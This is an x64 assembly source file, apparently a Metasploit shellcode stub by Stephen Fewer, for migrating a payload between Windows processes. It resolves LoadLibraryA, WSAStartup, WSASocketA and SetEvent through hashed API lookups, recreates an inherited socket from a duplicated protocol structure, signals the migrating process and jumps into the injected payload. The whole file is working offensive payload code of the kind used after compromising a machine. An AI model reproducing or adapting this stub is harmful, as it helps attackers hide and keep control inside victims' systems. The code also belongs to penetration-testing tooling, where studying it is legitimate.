;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, 2003, XP
; Architecture: x64
; Version: 1.0 (Jan 2010)
; Size: 314 bytes
; Build: >build.py migrate
;-----------------------------------------------------------------------------;

; typedef struct MigrateContext
; {
; 	union
; 	{
; 		HANDLE hEvent;
; 		BYTE bPadding1[8];
; 	} e;
; 	union
; 	{
; 		LPVOID lpPayload;
; 		BYTE bPadding2[8];
; 	} p;
; 	WSAPROTOCOL_INFO info;
; } MIGRATECONTEXT, * LPMIGRATECONTEXT;

[BITS 64]
[ORG 0]

  cld                    ; Clear the direction flag.
  mov rsi, rcx           ; RCX is a pointer to our migration stub context
  sub rsp, 0x2000        ; Alloc some space on stack
  and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "./src/block/block_api.asm"
start:                   ;
  pop rbp                ; Pop off the address of 'api_call' for calling later.
  ; setup the structures we need on the stack...
  mov r14, 'ws2_32'      ; 
  push r14               ; Push the bytes 'ws2_32',0,0 onto the stack.
  mov rcx, rsp           ; save pointer to the "ws2_32" string for LoadLibraryA call.
  sub rsp, 408+8         ; alloc sizeof( struct WSAData ) bytes for the WSAData structure (+8 for alignment)
  mov r13, rsp           ; save pointer to the WSAData structure for WSAStartup call.
  sub rsp, 0x28          ; alloc space for function calls
  ; perform the call to LoadLibraryA...
  mov r10d, 0x0726774C   ; hash( "kernel32.dll", "LoadLibraryA" )
  call rbp               ; LoadLibraryA( "ws2_32" )
  ; perform the call to WSAStartup...
  mov rdx, r13           ; second param is a pointer to this stuct
  push byte 2            ;
  pop rcx                ; set the param for the version requested
  mov r10d, 0x006B8029   ; hash( "ws2_32.dll", "WSAStartup" )
  call rbp               ; WSAStartup( 2, &WSAData );
  ; perform the call to WSASocketA...
  xor r8, r8             ; we do not specify a protocol
  push r8                ; push zero for the flags param.
  push r8                ; push null for reserved parameter
  lea r9, [rsi+16]       ; We specify the WSAPROTOCOL_INFO structure from the MigrateContext
  push byte 1            ;
  pop rdx                ; SOCK_STREAM == 1
  push byte 2            ; 
  pop rcx                ; AF_INET == 2
  mov r10d, 0xE0DF0FEA   ; hash( "ws2_32.dll", "WSASocketA" )
  call rbp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, &info, 0, 0 );
  mov rdi, rax           ; save the socket for later
  ; perform the call to SetEvent...
  mov rcx, qword [rsi]   ; Set the first parameter to the migrate event
  mov r10d, 0x35269F1D   ; hash( "kernel32.dll", "SetEvent" )
  call rbp               ; SetEvent( hEvent );
  ; perform the call to the payload...
  call qword [rsi+8]     ; Call the payload...
  